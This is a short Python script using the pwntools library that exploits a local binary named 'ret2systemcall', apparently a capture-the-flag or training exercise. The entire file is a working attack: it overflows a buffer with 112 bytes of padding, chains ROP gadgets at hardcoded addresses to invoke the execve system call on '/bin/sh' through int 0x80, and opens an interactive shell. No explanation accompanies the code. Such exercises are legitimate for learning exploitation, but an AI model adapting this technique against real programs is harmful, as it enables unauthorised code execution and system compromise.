#!/usr/bin/env python
from pwn import *
context.log_level='debug'
sh = process('./ret2systemcall')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
pwnlib.gdb.attach(sh)
pause()
sh.sendline(payload)
sh.interactive()
